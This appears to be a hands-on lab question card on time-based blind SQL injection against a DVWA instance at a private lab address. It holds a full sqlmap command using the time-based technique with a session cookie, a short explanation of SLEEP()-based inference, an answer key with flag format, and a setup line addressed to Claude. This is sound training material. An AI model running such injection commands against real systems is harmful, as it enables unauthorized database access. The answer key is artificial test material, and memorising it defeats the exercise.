# Q264 — Time-Based Blind Injection

| Field | Value |
|-------|-------|
| **Target** | `192.168.52.129` |
| **Domain** | Web Apps / SQL Injection |
| **Difficulty** | 🔴 Hard |
| **Tools** | `sqlmap` |
| **Time budget** | 10–15 min |

---

## 📝 Question

"Force sqlmap to use only time-based blind technique with --technique=T. How does time-based differ from boolean-based?"

---

## 🎯 Flag Format

```
technique=<type>; how_it_works=<description>
```

---

## ✅ Solution

```bash
sqlmap -u "http://192.168.52.129/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="PHPSESSID=<session>;security=low" --technique=T --dbs --batch
```

Time-based uses SLEEP() function. True = delay, False = immediate response.

**Answer:** `technique=time-based; how_it_works=uses_sleep_delay`

---

## 🤖 Claude Setup Prompt

Same as Q251. Report back: "Lab ready for Q264"
